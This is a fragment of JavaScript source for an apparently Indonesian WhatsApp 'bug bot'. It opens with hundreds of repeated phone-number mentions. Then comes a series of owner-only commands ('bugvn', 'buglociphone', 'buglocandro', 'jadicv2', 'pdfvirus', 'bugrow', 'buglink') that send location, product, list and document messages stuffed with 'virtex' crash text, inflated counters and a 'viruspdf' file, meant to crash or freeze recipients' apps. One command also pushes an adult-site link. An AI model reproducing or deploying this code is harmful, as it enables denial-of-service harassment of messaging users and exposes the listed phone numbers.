~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~`
zoe.sendMessage(from, textt, text, {quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
break
case 'bugvn':
if (!dev.key.fromMe && !isOwner) return
gmemek = fs.readFileSync('./random/iyain.mp3')
zoe.sendMessage(from, gmemek, audio, { quoted: dev, audioname:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
					case 'jadic':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await zoe.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q}`,
             "description": `${vapi}`,
             "retailerId": "zoe",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: dev, contextInfo:{}})
   zoe.relayWAMessage(res)
}
break
case 'buglociphone':
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}buglociphone namalu`)
 zoe.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `dev ${iphone}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'virlok':
if (!dev.key.fromMe) return reply('Lu siapa')
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`${prefix}virlok teks`)
 zoe.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `${q}.    ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'virlok':
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`${prefix}virlok teks`)
 zoe.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `${q}.    ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'jadicv2':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await zoe.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q} ${jadicatalog}`,
             "description": `${virtexctlgg} ${katalogv3}`,
             "retailerId": "zoe",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: dev, contextInfo:{}})
   zoe.relayWAMessage(res)
}
break
case 'buglocandro':
if (!dev.key.fromMe) return reply('Lu siapa')
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}buglocandro namalu`)
 zoe.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `zoe ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'buglocandro':
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}buglocandro namalu`)
 zoe.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `zoe ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'jadicv3':
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await zoe.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "thumbnail": virgam,
             "title": `${virtexbyzoe}`,
             "description": `${virtexctlgg} ${katalogv3}`,
             "retailerId": "zoe",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: dev, contextInfo:{}})
   zoe.relayWAMessage(res)
}
break
case 'buglociphone':
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugcatalog namalu`)
 zoe.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `dev ${iphone}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'bugweb':
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugweb namalu`)
	zoe.sendMessage(from, `https://nhentai.net/g/316755/\n${q}`, text, { quoted: dev, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${q}                         ${vapi}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/dr6GK0n/186c3c95cfa6.jpg",
                "thumbnail": thumb,
                "sourceUrl": "https://nhentai.net/g/316755/"}}})
                break 
case 'bugwebv2':
if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugwebv2 namalu`)
	zoe.sendMessage(from, `https://nhentai.net/g/316755/\n${q}`, text, { quoted: dev, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${q}              ${zoemods}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/dr6GK0n/186c3c95cfa6.jpg",
                "thumbnail": thumb,
                "sourceUrl": "https://nhentai.net/g/316755/"}}})
                break 
case 'pdfvirus':
         if (!dev.key.fromMe && !isOwner) return
virus = fs.readFileSync('./src/viruspdf.pdf')
zoe.sendMessage(from, virus, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${virtexbyzoe} ${virtex6(prefix)} .${virtexbyzoe} ${virtexbyzoe}`, mimetype: 'application/txt'})
break
case 'pdfvirusreal':
         if (!dev.key.fromMe && !isOwner) return
virus = fs.readFileSync('./src/viruspdf.pdf')
zoe.sendMessage(from, virus, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } , mimetype: 'application/txt'})
break
case 'bugrow':
if (!isOwner && !dev.key.fromMe) return reply(mess.only.ownerB)
zoe.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'BUG ROW',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
zoe.sendMessage(from, listMsg, MessageType.listMessage, {quoted:dev})
zoe.toggleDisappearingMessages(from, 0)
break
case 'buglink':
                if (!dev.key.fromMe && !isOwner) return reply('Khusus Owner !!')
                 zoe.toggleDisappearingMessages(from, 0)
              zoe.sendMessage(from, virtex2(prefix), text, { quoted:dev, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": vapi,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./media/virgam3.jpeg`),
                "sourceUrl": "https://youtu.be/7zgPEu1F_NA"}}})
                break         
                case 'infoall': case 'tagall':
                if (!dev.key.fromMe) return reply('Lu siapa')
if (!dev.key.fromMe & !isOwner) return reply(mess.only.admin)
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
